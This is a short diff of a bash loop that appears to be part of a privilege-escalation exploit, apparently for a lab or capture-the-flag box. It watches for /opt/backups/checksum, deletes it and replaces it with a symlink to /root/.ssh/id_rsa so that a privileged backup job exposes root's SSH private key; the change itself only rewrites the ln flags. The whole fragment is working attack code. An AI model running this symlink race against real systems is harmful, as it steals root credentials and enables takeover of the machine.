@@ -4,7 +4,7 @@ while true; do
     if [ -e /opt/backups/checksum ]; then
         rm -f /opt/backups/checksum
         echo '[+] Checksum file removed'
-        ln -sf /root/.ssh/id_rsa /opt/backups/checksum
+        ln -s -f /root/.ssh/id_rsa /opt/backups/checksum
         echo '[+] Symlink placed'
         break
     fi
